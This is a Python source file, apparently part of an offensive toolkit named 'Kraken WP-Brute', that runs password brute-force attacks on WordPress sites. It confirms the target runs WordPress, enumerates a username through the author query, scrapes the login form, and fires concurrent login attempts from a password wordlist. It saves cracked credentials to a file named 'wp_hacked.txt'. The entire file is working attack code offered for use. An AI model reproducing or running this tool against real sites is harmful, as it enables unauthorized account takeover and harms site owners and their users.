import os
import sys
import time
import requests
import re
from random import choice
from colorama import Fore, Style
import gevent
from gevent.pool import Pool
from gevent import monkey

monkey.patch_all()

from core.ui import clear_console, display_banner, status, success, error, info
from core.utils import load_file_lines
from core.logger import setup_logger

script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')
os.makedirs(results_dir, exist_ok=True)

logger = setup_logger(os.path.join(logs_dir, 'wp_brute.log'))

def validate_wp(site):
    status(f"Validating if {site} is a WordPress site...")
    try:
        r = requests.get(site, timeout=10)
        if 'wp-content' in r.text or '/wp-login.php' in r.text:
            success(f"{site} is confirmed as a WordPress site.")
            return True
        else:
            error(f"{site} is not a WordPress site.")
            logger.error(f"{site} is not a WordPress site.")
            sys.exit(1)
    except Exception as e:
        error(f"Error during validation: {str(e)}")
        logger.error(f"Validation error: {str(e)}")
        sys.exit(1)

def enumerate_username(site):
    status(f"Attempting to enumerate username from {site}...")
    try:
        r = requests.get(f'{site}/?author=1', timeout=10)
        if '/author/' in r.text:
            username = re.search(r'/author/(.*)/"', r.text).group(1)
            if '/feed' in username:
                username = re.search(r'/author/(.*)/feed/"', r.text).group(1)
            return username
        status(Fore.YELLOW + "Username enumeration failed.")
        return None
    except Exception as e:
        logger.error(f"Enumeration error: {str(e)}")
        return None

def fetch_wp_values(site):
    status(f"Fetching WordPress form values from {site}...")
    try:
        agent = {'User-Agent': 'Mozilla/5.0'}
        r = requests.get(site + '/wp-login.php', timeout=5, headers=agent)
        wp_submit_match = re.search(r'class="button button-primary button-large" value="(.*)"', r.text)
        wp_submit_value = wp_submit_match.group(1) if wp_submit_match else 'Log In'
        wp_redirect_match = re.search(r'name="redirect_to" value="(.*)"', r.text)
        wp_redirect_to = wp_redirect_match.group(1) if wp_redirect_match else f'{site}/wp-admin/'
        success("Form values fetched successfully.")
        return wp_submit_value, wp_redirect_to
    except Exception as e:
        error(f"Error fetching form values: {str(e)}")
        logger.error(f"Fetch error: {str(e)}")
        sys.exit(1)

def attempt_login(site, username, password, wp_submit_value, wp_redirect_to, attempt_number, total_attempts, start_time):
    agent = {'User-Agent': 'Mozilla/5.0'}
    post_data = {
        'log': username,
        'pwd': password,
        'wp-submit': wp_submit_value,
        'redirect_to': wp_redirect_to,
        'testcookie': 1
    }

    try:
        response = requests.post(site + '/wp-login.php', data=post_data, headers=agent, timeout=10)
        
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts) if attempt_number > 0 else 0
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))

        if 'wordpress_logged_in_' in str(response.cookies):
            success_msg = (
                f"\n[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Expected Left: {time_remaining_str} |\n"
                f"{Fore.GREEN + Style.BRIGHT}SUCCESS! Valid credentials found!{Style.RESET_ALL}\n"
                f"{Fore.YELLOW}{'-'*40}\n"
                f"URL: {Fore.CYAN}{site}/wp-login.php{Style.RESET_ALL}\n"
                f"Username: {Fore.YELLOW}{username}{Style.RESET_ALL}\n"
                f"Password: {Fore.YELLOW}{password}{Style.RESET_ALL}\n"
                f"{Fore.YELLOW}{'-'*40}\n"
            )
            sys.stdout.write('\033[K')
            print(success_msg)
            with open(os.path.join(results_dir, 'wp_hacked.txt'), 'a') as writer:
                writer.write(success_msg)
            return True
        else:
            sys.stdout.write(Fore.MAGENTA + f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Expected Left: {time_remaining_str} | Current: {username}:{password}" + " " * 5)
            sys.stdout.flush()
            return False
    except Exception as e:
        logger.error(f"Login attempt error: {str(e)}")
        return False

def execute_brute(site, username, passwords, wp_submit_value, wp_redirect_to, threads):
    total_attempts = len(passwords)
    start_time = time.time()
    attempt_counter = [0]

    def worker(password):
        attempt_counter[0] += 1
        return attempt_login(site, username, password, wp_submit_value, wp_redirect_to, attempt_counter[0], total_attempts, start_time)

    pool = Pool(threads)
    try:
        pool.map(worker, passwords)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Script interrupted by user. Shutting down threads...")
        os._exit(0)

    sys.stdout.write('\n')
    print(Fore.GREEN + "\nBrute-force attack completed.")

def run(target, users_file, username, passwords_file, threads):
    clear_console()
    display_banner("Kraken WP-Brute")
    info("\n" + "="*80 + "\n")

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    validate_wp(target)

    if not username:
        username = enumerate_username(target)
        if not username:
            if users_file:
                usernames = load_file_lines(users_file)
                username = usernames[0] if usernames else None
            else:
                error("No username or user list provided, and enumeration failed.")
                sys.exit(1)

    passwords = load_file_lines(passwords_file)
    if not passwords:
        error(f'Password list {passwords_file} is empty or missing.')
        sys.exit(1)

    wp_submit_value, wp_redirect_to = fetch_wp_values(target)
    execute_brute(target, username, passwords, wp_submit_value, wp_redirect_to, threads)

def run_interactive():
    clear_console()
    display_banner("Kraken WP-Brute")
    
    site = input(Fore.WHITE + '[i] Enter the target: ').strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site

    status("Processing site input...")
    validate_wp(site)

    username = enumerate_username(site)
    if not username:
        use_list = input(Fore.WHITE + "[i] Use username list? (Y/n): " + Fore.RESET).strip().lower()
        if use_list != 'n':
            user_file_default = os.path.join(script_dir, "..", "wordlists", "users.txt")
            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt): " + Fore.RESET).strip() or user_file_default
            usernames = load_file_lines(user_file)
            if not usernames:
                error("No usernames found in the list.")
                sys.exit(1)
            username = usernames[0]
            success(f"First username from the list selected: {username}")
        else:
            username = input(Fore.WHITE + "[i] Enter username : " + Fore.RESET).strip()
            if not username:
                error("No username provided.")
                sys.exit(1)
            success(f"Username entered manually: {username}")
    else:
        success(f"Username found via enumeration: {username}")
        with open(os.path.join(results_dir, 'found_username.txt'), 'w') as user_file:
            user_file.write(f"Found username: {username}\n")

    pwd_file_default = os.path.join(script_dir, "..", "wordlists", "passwords.txt")
    pwd_file = input(Fore.WHITE + "[i] Password list (default: passwords.txt): " + Fore.RESET).strip() or pwd_file_default
    passwords = load_file_lines(pwd_file)
    
    threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10): ") or 10)

    if not username or not passwords:
        error("Error: The username or password list is empty or could not be found.")
        sys.exit(1)

    status("All inputs received successfully.")
    print(Fore.YELLOW + "-"*60)
    print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
    
    wp_submit_value, wp_redirect_to = fetch_wp_values(site)
    execute_brute(site, username, passwords, wp_submit_value, wp_redirect_to, threads)

if __name__ == '__main__':
    try:
        run_interactive()
    except KeyboardInterrupt:
        logger.info("Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")
